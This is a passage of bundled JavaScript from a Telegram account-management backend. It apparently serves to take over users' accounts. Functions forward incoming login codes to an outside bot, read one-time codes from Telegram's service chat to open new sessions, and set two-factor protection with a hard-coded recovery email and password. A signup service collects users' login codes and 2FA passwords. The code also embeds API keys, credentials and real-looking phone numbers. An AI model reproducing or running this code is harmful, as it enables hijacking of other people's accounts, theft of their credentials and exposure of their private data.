                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000));
                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(event.message.text)}`);
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll(),
                ],
            }));
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new tl_1.Api.account.UpdateProfile(data));
            console.log("Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new tl_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        console.log("Failed to download the photo.");
                    }
                }
                else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                console.log("No profile photos found.");
            }
        }
        catch (err) {
            console.error("Error:", err);
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!this.isAuthMine(auth)) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }
    async getContacts() {
        const exportedContacts = await this.client.invoke(new tl_1.Api.contacts.GetContacts({
            hash: (0, big_integer_1.default)(0)
        }));
        return exportedContacts;
    }
    async deleteChat(chatId) {
        try {
            await this.client.invoke(new tl_1.Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: false,
            }));
            console.log(`Dialog with ID ${chatId} has been deleted.`);
        }
        catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }
    async blockUser(chatId) {
        try {
            await this.client?.invoke(new tl_1.Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            console.error('Failed to block user:', error);
        }
    }
    downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    async getMediaMetadata(chatId = 'me', offset = undefined, limit = 100) {
        try {
            const query = { limit: parseInt(limit.toString()) };
            if (offset)
                query['offsetId'] = parseInt(offset.toString());
            const messages = await this.client.getMessages(chatId, query);
            const mediaMessages = messages.filter(message => {
                return (message.media && message.media.className !== "MessageMediaWebPage");
            });
            console.log("Total:", messages.total, "fetched: ", messages.length, "ChatId: ", chatId, "Media :", mediaMessages.length);
            if (!messages.length) {
                console.log("No more media messages found. Reached the end of the chat.");
                return { data: [], endOfMessages: true };
            }
            const data = [];
            for (const message of mediaMessages) {
                console.log(message.media.className, message.document?.mimeType);
                let thumbBuffer = null;
                try {
                    if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
                        const sizes = message.photo?.sizes || [1];
                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                        console.log("messageId image:", message.id);
                        data.push({
                            messageId: message.id,
                            mediaType: 'photo',
                            thumb: thumbBuffer?.toString('base64') || null,
                        });
                    }
                    else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                        const sizes = message.document?.thumbs || [1];
                        console.log("messageId video:", message.id);
                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                        data.push({
                            messageId: message.id,
                            mediaType: 'video',
                            thumb: thumbBuffer?.toString('base64') || null,
                        });
                    }
                }
                catch (downloadError) {
                    if (downloadError.message === 'Download timeout') {
                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);
                    }
                    else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {
                        console.warn('File reference expired for message. Skipping this media.');
                    }
                    else {
                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);
                    }
                    data.push({
                        messageId: message.id,
                        mediaType: 'photo',
                        thumb: null,
                    });
                    continue;
                }
            }
            if (!data.length) {
                data.push({
                    messageId: messages[messages.length - 1].id,
                    mediaType: 'photo',
                    thumb: null,
                });
            }
            console.log("Returning ", data.length);
            return { data, endOfMessages: false };
        }
        catch (error) {
            console.error('Error in getMediaMetadata:', error);
            if (error.message.includes('FLOOD_WAIT')) {
                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\d+)/)[1], 10);
                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);
                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                return this.getMediaMetadata(chatId, offset, limit);
            }
            throw new Error('Error fetching media metadata');
        }
    }
    async downloadMediaFile(messageId, chatId = 'me', res) {
        try {
            const messages = await this.client.getMessages(chatId, { ids: [messageId] });
            const message = messages[0];
            if (message && !(message.media instanceof tl_1.Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || message.photo;
                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };
                if (media instanceof tl_1.Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new tl_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                }
                else if (media instanceof tl_1.Api.MessageMediaDocument) {
                    contentType = media.mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new tl_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                }
                else {
                    return res.status(415).send('Unsupported media type');
                }
                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                const chunkSize = 512 * 1024;
                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: big_integer_1.default[0],
                    limit: 5 * 1024 * 1024,
                    requestSize: chunkSize,
                })) {
                    res.write(chunk);
                }
                res.end();
            }
            else {
                res.status(404).send('Media not found');
            }
        }
        catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }
    async forwardMessage(chatId, messageId) {
        try {
            await this.client.forwardMessages("@fuckyoubabie", { fromPeer: chatId, messages: messageId });
        }
        catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            }
            catch (error) {
                console.log(error);
            }
        }
        else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(new tl_1.Api.account.CheckUsername({ username }));
                    console.log(result, " - ", username);
                    if (result) {
                        const res = await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        username = baseUsername + increment;
                        increment++;
                        await (0, Helpers_1.sleep)(2000);
                    }
                }
                catch (error) {
                    console.log(error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                    await (0, Helpers_1.sleep)(2000);
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyForwards(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("forwards Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async getFileUrl(url, filename) {
        const response = await axios_1.default.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', () => resolve(true));
            writer.on('error', reject);
        });
        return filePath;
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            console.log("file uploaded");
            await this.client.invoke(new tl_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new tl_1.Api.account.GetPassword());
        return passwordInfo.hasPassword;
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");
                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            }
                                            else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        }
                                        catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', (0, utils_1.parseError)(e));
                                return Promise.resolve("error");
                            }
                        });
                        return twoFaDetails;
                    }
                    else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            }
            catch (e) {
                console.error("Unable to connect to mail server:", (0, utils_1.parseError)(e));
            }
        }
        else {
            console.log("Password already exists");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.log(`Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new tl_1.Api.photos.DeletePhotos({
                    id: result.photos
                }));
            }
            console.log("Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
    async createNewSession() {
        const me = await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err) => { throw err; },
        });
        const session = newClient.session.save();
        await newClient.disconnect();
        console.log("New Session: ", session);
        return session;
    }
    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i);
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code);
                    return code;
                }
                else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            catch (err) {
                await (0, Helpers_1.sleep)(2000);
                console.log(err);
            }
        }
    }
}
exports["default"] = TelegramManager;


/***/ }),

/***/ "./src/components/Telegram/dto/addContact.dto.ts":
/*!*******************************************************!*\
  !*** ./src/components/Telegram/dto/addContact.dto.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddContactDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class AddContactDto {
}
exports.AddContactDto = AddContactDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'The mobile number of the user for authentication',
        example: '+1234567890',
    }),
    __metadata("design:type", String)
], AddContactDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'List of phone numbers to add as contacts',
        type: Object,
        example: [
            {
                mobile: '+1234567890',
                tgId: "1234567890"
            }
        ],
    }),
    __metadata("design:type", Array)
], AddContactDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Prefix for automated contact names',
        example: 'Contact',
    }),
    __metadata("design:type", String)
], AddContactDto.prototype, "prefix", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/addContacts.dto.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/dto/addContacts.dto.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddContactsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class AddContactsDto {
}
exports.AddContactsDto = AddContactsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'The mobile number of the user for authentication',
        example: '+1234567890',
    }),
    __metadata("design:type", String)
], AddContactsDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'List of phone numbers to add as contacts',
        type: Object,
        example: [
            "919892184284", "919967837841", "919972600626",
        ],
    }),
    __metadata("design:type", Array)
], AddContactsDto.prototype, "phoneNumbers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Prefix for automated contact names',
        example: 'Contact',
    }),
    __metadata("design:type", String)
], AddContactsDto.prototype, "prefix", void 0);


/***/ }),

/***/ "./src/components/TgSignup/TgSignup.module.ts":
/*!****************************************************!*\
  !*** ./src/components/TgSignup/TgSignup.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const tgSignup_controller_1 = __webpack_require__(/*! ./tgSignup.controller */ "./src/components/TgSignup/tgSignup.controller.ts");
let TgSignupModule = class TgSignupModule {
};
exports.TgSignupModule = TgSignupModule;
exports.TgSignupModule = TgSignupModule = __decorate([
    (0, common_1.Module)({
        imports: [],
        controllers: [tgSignup_controller_1.TgSignupController]
    })
], TgSignupModule);


/***/ }),

/***/ "./src/components/TgSignup/TgSignup.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/TgSignup/TgSignup.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupService = void 0;
exports.restAcc = restAcc;
exports.getClient = getClient;
exports.hasClient = hasClient;
exports.deleteClient = deleteClient;
exports.disconnectAll = disconnectAll;
exports.createClient = createClient;
const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const Password_1 = __webpack_require__(/*! telegram/Password */ "telegram/Password");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const clients = new Map();
let creds = [
    {
        apiId: 27919939,
        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
    },
    {
        apiId: 25328268,
        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
    },
    {
        apiId: 2899,
        apiHash: "36722c72256a24c1225de00eb6a1ca74"
    },
    {
        apiId: 24559917,
        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
    },
    {
        apiId: 12777557,
        apiHash: "05054fc7885dcfa18eb7432865ea3500"
    },
    {
        apiId: 27565391,
        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
    },
    {
        apiId: 27586636,
        apiHash: "f020539b6bb5b945186d39b3ff1dd998"
    },
    {
        apiId: 29210552,
        apiHash: "f3dbae7e628b312c829e1bd341f1e9a9"
    }
];
async function restAcc(phoneNumber) {
    await (0, Helpers_1.sleep)(1000);
    console.log("Reset - ", phoneNumber);
    const client = getClient(phoneNumber);
    if (client) {
        await client.client?.destroy();
        await client.client?.disconnect();
        client.client.session.delete();
        client.session.delete();
        client.client._destroyed = true;
        client.client = null;
        delete client['client'];
        await deleteClient(phoneNumber);
    }
}
function getClient(number) {
    return clients.get(number);
}
async function hasClient(number) {
    return clients.has(number);
}
function contains(str, arr) {
    return (arr.some(element => {
        if (str?.includes(element)) {
            return true;
        }
        return false;
    }));
}
;
async function deleteClient(number) {
    console.log("Deleting Client - ", number);
    const cli = getClient(number);
    await cli?.disconnect();
    return clients.delete(number);
}
async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        }
        catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}
async function createClient(number) {
    try {
        if (clients.has(number)) {
            console.log("Client already exist");
            const cli = clients.get(number);
            setTimeout(async () => {
                await restAcc(number);
            }, 120000);
            return (await cli.sendCode(false));
        }
        else {
            const randomIndex = Math.floor(Math.random() * creds.length);
            const apiHash = creds[randomIndex].apiHash;
            const apiId = creds[randomIndex].apiId;
            console.log("Creating new client - ", number, creds[randomIndex]);
            const cli = new TgSignupService(number, apiId, apiHash);
            clients.set(number, cli);
            await (0, Helpers_1.sleep)(500);
            return (await cli.sendCode(false));
        }
    }
    catch (error) {
        console.log((0, utils_1.parseError)(error));
        throw new common_1.BadRequestException((0, utils_1.parseError)(error).message);
    }
}
class TgSignupService {
    constructor(number, apiId, apiHash) {
        this.apiId = apiId;
        this.apiHash = apiHash;
        this.phoneNumber = number;
        this.session = new sessions_1.StringSession('');
        this.client = null;
        this.createClient();
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return latest;
    }
    async disconnect() {
        await this.client?.disconnect();
        await this.client?.destroy();
        await this.session.delete();
        this.client = null;
    }
    async createClient() {
        try {
            console.log(this.apiId, this.apiHash);
            this.client = new telegram_1.TelegramClient(this.session, this.apiId, this.apiHash, {
                connectionRetries: 5,
            });
            await this.client.setLogLevel(Logger_1.LogLevel.ERROR);
            await this.client.connect();
        }
        catch (error) {
            console.log("Error while Connecting:", error);
        }
    }
    async deleteMessages() {
        console.log("DeleteMessages TODO");
    }
    async sendCode(forceSMS = false) {
        try {
            await this.client.connect();
            console.log("Sending OTP - ", this.phoneNumber, this.apiId, this.apiHash);
            try {
                const sendResult = await this.client.invoke(new tl_1.Api.auth.SendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    apiId: this.apiId,
                    apiHash: this.apiHash,
                    settings: new tl_1.Api.CodeSettings({}),
                }));
                console.log('Send result - ', sendResult);
                setTimeout(async () => {
                    await restAcc(this.phoneNumber);
                }, 150000);
                if (sendResult instanceof tl_1.Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after sending the code");
                this.phoneCodeHash = sendResult.phoneCodeHash;
                if (!forceSMS || sendResult.type instanceof tl_1.Api.auth.SentCodeTypeSms) {
                    return {
                        phoneCodeHash: sendResult.phoneCodeHash,
                        isCodeViaApp: sendResult.type instanceof tl_1.Api.auth.SentCodeTypeApp,
                    };
                }
                const resendResult = await this.client.invoke(new tl_1.Api.auth.ResendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: sendResult.phoneCodeHash,
                }));
                console.log('ReSend result - ', sendResult);
                if (resendResult instanceof tl_1.Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after resending the code");
                this.phoneCodeHash = resendResult.phoneCodeHash;
                return {
                    phoneCodeHash: resendResult.phoneCodeHash,
                    isCodeViaApp: resendResult.type instanceof tl_1.Api.auth.SentCodeTypeApp,
                };
            }
            catch (sendCodeError) {
                console.log("Error in sending code:", sendCodeError);
                throw sendCodeError;
            }
        }
        catch (err) {
            if (err.errorMessage === "AUTH_RESTART") {
                try {
                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
                }
                catch (error) {
                    console.log("heelo: ", error);
                }
            }
            else {
                throw err;
            }
        }
    }
    async login(phoneCode, passowrd) {
        let isRegistrationRequired = false;
        let termsOfService;
        try {
            if (!phoneCode) {
                throw new Error("Code is empty");
            }
            if (!this.client.connected) {
                await this.client.connect();
            }
            const result = await this.client?.invoke(new tl_1.Api.auth.SignIn({
                phoneNumber: `+${this.phoneNumber}`,
                phoneCodeHash: this.phoneCodeHash,
                phoneCode
            }));
            if (result instanceof tl_1.Api.auth.AuthorizationSignUpRequired) {
                isRegistrationRequired = true;
                termsOfService = result.termsOfService;
            }
            else {
                await this.processLogin(result.user);
                await restAcc(this.phoneNumber);
                return { status: 200, message: "Login success" };
            }
        }
        catch (err) {
            console.log(err);
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                console.log("passowrd Required");
                try {
                    const passwordSrpResult = await this.client.invoke(new tl_1.Api.account.GetPassword());
                    const passwordSrpCheck = await (0, Password_1.computeCheck)(passwordSrpResult, passowrd);
                    const { user } = (await this.client.invoke(new tl_1.Api.auth.CheckPassword({
                        password: passwordSrpCheck,
                    })));
                    this.processLogin(user, passowrd);
                    return { status: 200, message: "Login success" };
                }
                catch (error) {
                    if (passowrd && passowrd !== '') {
                        return { status: 400, message: "Incorrect Password!<br/>Enter your telegram Two-Factor-Authentication password." };
                    }
                    else {
                        return { status: 400, message: "Telegram 2FA Password" };
                    }
                }
            }
            else {
                const shouldWeStop = false;
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
            return { status: 400, message: err.errorMessage };
        }
        if (isRegistrationRequired) {
            try {
                let lastName = 'last name';
                let firstName = "first name";
                const { user } = (await this.client.invoke(new tl_1.Api.auth.SignUp({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: this.phoneCodeHash,
                    firstName,
                    lastName,
                })));
                if (termsOfService) {
                    await this.client.invoke(new tl_1.Api.help.AcceptTermsOfService({
                        id: termsOfService.id,
                    }));
                }
                return user;
            }
            catch (err) {
                const shouldWeStop = false;
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
        }
    }
    async getCallLogs() {
        try {
            const result = await this.client.invoke(new tl_1.Api.messages.Search({
                peer: new tl_1.Api.InputPeerEmpty(),
                q: '',
                filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 100,
                maxId: 0,
                minId: 0,
                hash: big_integer_1.default.zero,
            }));
            console.log("Got Messages");
            const callLogs = result.messages.filter(message => message.action instanceof tl_1.Api.MessageActionPhoneCall);
            console.log("filtered call logs");
            const filteredResults = {
                outgoing: 0,
                incoming: 0,
                video: 0,
                chatCallCounts: {},
                totalCalls: 0
            };
            for (const log of callLogs) {
                try {
                    filteredResults.totalCalls++;
                    const callInfo = {
